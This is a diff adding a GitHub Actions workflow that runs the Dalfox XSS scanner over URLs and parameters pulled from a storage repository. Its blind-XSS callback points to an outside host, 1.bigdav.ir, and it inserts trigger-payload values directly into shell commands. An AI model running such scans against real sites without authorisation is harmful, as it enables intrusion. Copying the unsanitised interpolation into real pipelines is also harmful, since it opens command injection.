@@ -1,0 +1,72 @@
+name: Dalfox XSS Scanner
+
+on:
+  repository_dispatch:
+    types: [dalfox-trigger]
+
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout main branch
+        uses: actions/checkout@v3
+
+      - name: Setup Go
+        uses: actions/setup-go@v3
+        with:
+          go-version: '1.18'
+
+      - name: Install Dalfox
+        run: go install github.com/hahwul/dalfox/v2@latest
+
+      - name: Setup SSH
+        uses: webfactory/ssh-agent@v0.5.4
+        with:
+          ssh-private-key: ${{ secrets.DEPLOY_KEY }}
+
+      - name: Add github.com to known_hosts
+        run: ssh-keyscan github.com >> ~/.ssh/known_hosts
+
+      - name: Clone Storage Repo
+        run: git clone ${{ github.event.client_payload.storage_repo }} storage_repo_clone
+
+      - name: Run Dalfox Scan
+        run: |
+          set -e
+          TARGET_NAME=${{ github.event.client_payload.target_name }}
+          URL_FILE_PATH="storage_repo_clone/$TARGET_NAME/live-urls.txt"
+          PARAMS_FILE_PATH="storage_repo_clone/$TARGET_NAME/params.txt"
+          OUTPUT_FILE="dalfox-output.txt"
+          PAYLOAD_FILE="dalfox_payload.txt"
+
+          if [ ! -f "$URL_FILE_PATH" ]; then
+            echo "URL file not found: $URL_FILE_PATH"
+            exit 1
+          fi
+
+          if [ ! -f "$PARAMS_FILE_PATH" ]; then
+            echo "Params file not found: $PARAMS_FILE_PATH"
+            exit 1
+          fi
+
+          echo "Starting Dalfox scans..." > $OUTPUT_FILE
+
+          while IFS= read -r parameter || [[ -n "$parameter" ]]; do
+            if [ -z "$parameter" ]; then
+              continue
+            fi
+            echo "Scanning with parameter: $parameter"
+            BLIND_XSS_URL="https://1.bigdav.ir/${parameter}-${TARGET_NAME}"
+
+            echo "Running: $HOME/go/bin/dalfox file $URL_FILE_PATH --custom-payload-file $PAYLOAD_FILE -b $BLIND_XSS_URL"
+            $HOME/go/bin/dalfox file "$URL_FILE_PATH" --custom-payload-file "$PAYLOAD_FILE" -b "$BLIND_XSS_URL" >> $OUTPUT_FILE 2>&1
+            echo "--------------------------------------------------" >> $OUTPUT_FILE
+          done < "$PARAMS_FILE_PATH"
+
+          echo "Dalfox scan complete. Output saved to $OUTPUT_FILE"
+
+      - name: Upload Dalfox Output
+        uses: actions/upload-artifact@v3
+        with:
+          name: dalfox-output
+          path: dalfox-output.txt
